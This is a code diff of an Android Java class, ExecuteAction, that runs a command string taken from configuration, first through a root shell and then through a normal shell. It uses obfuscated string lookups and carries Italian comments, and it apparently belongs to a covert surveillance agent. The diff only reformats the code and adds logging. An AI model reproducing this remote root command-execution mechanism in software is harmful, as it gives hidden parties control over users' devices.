@@ -33,9 +33,9 @@ import com.android.service.util.WChar;
  */
 public class ExecuteAction extends SubActionSlow {
 	private static final String TAG = "ExecuteAction";
-	
+
 	private String command;
-	
+
 	/**
 	 * Instantiates a new execute action.
 	 * 
@@ -43,7 +43,7 @@ public class ExecuteAction extends SubActionSlow {
 	 *            the conf params
 	 */
 	public ExecuteAction(final ConfAction params) {
-		super( params);
+		super(params);
 	}
 
 	/*
@@ -55,54 +55,66 @@ public class ExecuteAction extends SubActionSlow {
 	public boolean execute(Trigger trigger) {
 		if (this.command.length() == 0)
 			return false;
-		
+
 		// Proviamo ad eseguire il comando da root
 		try {
 			String cmd[] = { Configuration.shellFile, Messages.getString("35.0"), this.command }; // EXPORT
 			Process p = Runtime.getRuntime().exec(cmd);
-			
+
 			p.waitFor();
 			return true;
 		} catch (final Exception e1) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e1);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(e1);
 				Check.log(TAG + " (parse): Exception on parse() (root exec)");
 			}
 		}
-		
+
 		// Proviamo ad eseguire il comando da utente normale
 		try {
 			String cmd[] = { Messages.getString("35.1"), "-c", this.command }; // EXPORT
 			Process p = Runtime.getRuntime().exec(cmd);
-			
+
 			p.waitFor();
 			return true;
 		} catch (final Exception e1) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e1);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(e1);
 				Check.log(TAG + " (parse): Exception on parse() (non-root exec)");
 			}
 		}
-		
+
 		return false;
 	}
 
 	@Override
 	protected boolean parse(final ConfAction params) {
-		try {			
+		try {
 			this.command = params.getString("command");
-			
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (parse): " + this.command);
 			}
 		} catch (final ConfigurationException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: params FAILED");
 			}
-			
+
 			return false;
 		}
-		
+
 		return true;
 	}
 }
